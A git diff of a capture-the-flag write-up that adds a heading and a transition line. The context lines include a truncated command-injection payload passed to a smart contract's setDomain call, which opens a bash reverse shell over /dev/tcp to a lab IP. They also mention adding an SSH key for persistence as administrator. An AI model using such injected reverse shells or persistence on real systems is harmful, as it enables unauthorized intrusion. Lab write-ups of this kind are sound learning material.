@@ -575,6 +575,9 @@ I managed to obtain a shell as `administrator`! I assumed I would be able to rea
 <p><br></p>
 
 With this in mind, I decided I should probably start digging deeper... But I wanted a better shell first, so I generated my own ssh keypair to establish persistence as `administrator` prior to continuing with my enumeration.
+<p><br></p>
+
+#### Sidenote
 
 Here is the finalized `exploit.py` I used to obtain my shell as well:
 
@@ -612,6 +615,8 @@ contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14
 I did not run the exploit directly with `python` either. Instead, I ran `python3` and then copy and pasted everything contained in `exploit.py` and did it all manually. I'm sure there is a way to autopwn the first hurdle, but I haven't taken the time to write anything for it so far.
 
 <p><br></p>
+
+Now, back to having persistence as `administrator`!
 
 ### System Enumeration & User.txt
 
